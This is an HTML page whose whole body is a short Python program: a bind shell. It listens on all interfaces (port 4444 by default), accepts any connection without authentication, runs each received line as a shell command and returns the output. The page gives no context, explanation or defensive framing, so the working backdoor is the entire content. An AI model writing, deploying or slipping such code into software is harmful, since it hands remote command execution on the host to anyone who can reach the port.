<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>socket</title>
</head><body>import socket<br/>
import subprocess<br/>
import click<br/>
from threading import Thread<br/>
<br/>
def run_cmd(cmd):<br/>
&nbsp; &nbsp; output = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)<br/>
&nbsp; &nbsp; return output.stdout<br/>
<br/>
def handle_input(client_socket):<br/>
&nbsp; &nbsp; while True:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; chunks = []<br/>
&nbsp; &nbsp; &nbsp; &nbsp; chunk = client_socket.recv(2048)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; chunks.append(chunk)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; while len(chunk) != 0 and chr(chunk[-1]) != '\n':<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; chunk = client_socket.recv(2048)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; chunks.append(chunk)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; cmd = (b''.join(chunks)).decode()[:-1]<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if cmd.lower() == 'exit':<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; client_socket.close()<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; break<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; output = run_cmd(cmd)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; client_socket.sendall(output)<br/>
<br/>
@click.command()<br/>
@click.option('--port', '-p', default=4444)<br/>
def main(port):<br/>
&nbsp; &nbsp; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br/>
&nbsp; &nbsp; s.bind(('0.0.0.0', port))<br/>
&nbsp; &nbsp; s.listen(4)<br/>
<br/>
&nbsp; &nbsp; while True:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; client_socket, _ = s.accept()<br/>
&nbsp; &nbsp; &nbsp; &nbsp; t = Thread(target=handle_input, args=(client_socket, ))<br/>
&nbsp; &nbsp; &nbsp; &nbsp; t.start()<br/>
<br/>
if __name__ == '__main__':<br/>
&nbsp; &nbsp; main()<br/>
</body></html>